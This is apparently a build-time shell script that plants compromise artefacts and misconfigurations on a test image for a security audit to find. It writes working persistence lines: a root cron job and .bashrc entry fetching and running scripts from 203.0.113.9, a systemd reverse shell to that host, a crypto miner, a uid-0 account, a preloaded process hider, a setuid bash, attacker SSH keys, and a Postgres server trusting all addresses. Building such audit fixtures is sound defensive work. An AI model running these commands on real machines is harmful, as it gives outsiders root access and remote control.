#!/bin/sh
# Plant what the security audit has to find. Run once, at image build.
set -eu

# Persistence: a cron job that downloads and runs a script, a miner started
# at boot from a hidden folder in /tmp, a reverse shell as a service.
printf '* * * * * root curl -fsSL http://203.0.113.9/up.sh | sh\n' > /etc/cron.d/sysupdate
mkdir -p /var/spool/cron/crontabs
printf '@reboot /tmp/.ICE-unix/.x/kswapd -o stratum+tcp://pool.example:3333\n' > /var/spool/cron/crontabs/www-data
mkdir -p /etc/systemd/system
printf '[Service]\nExecStart=/bin/bash -c "bash -i >& /dev/tcp/203.0.113.9/443 0>&1"\nRestart=always\n' > /etc/systemd/system/dbus-org.helper.service
printf 'wget -qO- http://203.0.113.9/k | bash\n' >> /root/.bashrc

# Root by another name, a preloaded library, a setuid shell.
echo 'toor:x:0:0::/root:/bin/sh' >> /etc/passwd
echo '/usr/local/lib/libprocesshider.so' > /etc/ld.so.preload
mkdir -p /tmp/.x && cp /bin/bash /tmp/.x/bash && chmod 4755 /tmp/.x/bash

# A script root runs every two minutes that anyone can change.
mkdir -p /opt/scripts
printf '#!/bin/sh\necho backup\n' > /opt/scripts/backup.sh && chmod 777 /opt/scripts/backup.sh
printf '*/2 * * * * root /opt/scripts/backup.sh\n' >> /etc/crontab

# SSH keys: root's, and one for www-data, a system account.
mkdir -p /root/.ssh /var/www/.ssh
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEN0SgdIFGbOsQAzPU6tMFDlqcWG9WXqxL6b/l4MiUcg dylan@laptop' > /root/.ssh/authorized_keys
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEN0SgdIFGbOsQAzPU6tMFDlqcWG9WXqxL6b/l4MiUcg intruder' > /var/www/.ssh/authorized_keys
usermod -s /bin/bash www-data

# Postgres trusting the whole internet.
conf=$(ls -d /etc/postgresql/*/main)
echo "listen_addresses = '*'" >> "$conf/postgresql.conf"
echo 'host all all 0.0.0.0/0 trust' >> "$conf/pg_hba.conf"

# A WordPress blog with its .env and .git in the web root.
mkdir -p /var/www/blog/wp-includes /var/www/blog/wp-content/plugins/contact-form-7 /var/www/blog/.git
printf "<?php\n\$wp_version = '5.8.1';\n" > /var/www/blog/wp-includes/version.php
printf "<?php\n/*\nPlugin Name: Contact Form 7\nVersion: 5.3.1\n*/\n" > /var/www/blog/wp-content/plugins/contact-form-7/wp-contact-form-7.php
printf "<?php\ndefine('WP_DEBUG', true);\n" > /var/www/blog/wp-config.php
echo 'DB_PASSWORD=hunter2' > /var/www/blog/.env
echo 'ref: refs/heads/main' > /var/www/blog/.git/HEAD
printf 'server {\n  listen 80;\n  server_name blog.example.com;\n  root /var/www/blog;\n}\n' > /etc/nginx/sites-enabled/blog

# Packages with known vulnerabilities, for the panel to match.
cat > /srv/shop-api/package-lock.json <<'JSON'
{"name": "shop-api", "lockfileVersion": 3, "packages": {"": {"name": "shop-api"}, "node_modules/lodash": {"version": "4.17.15"}, "node_modules/minimist": {"version": "0.0.8"}}}
JSON
mkdir -p /opt/bot && printf 'requests==2.19.0\nDjango==3.2.0\n' > /opt/bot/requirements.txt
mkdir -p /srv/laravel
touch /srv/laravel/artisan && echo '{}' > /srv/laravel/composer.json
echo '{"packages": [{"name": "laravel/framework", "version": "v8.0.0"}]}' > /srv/laravel/composer.lock
printf 'APP_ENV=production\nAPP_KEY=base64:abc\nAPP_DEBUG=true\n' > /srv/laravel/.env
chmod 644 /srv/laravel/.env
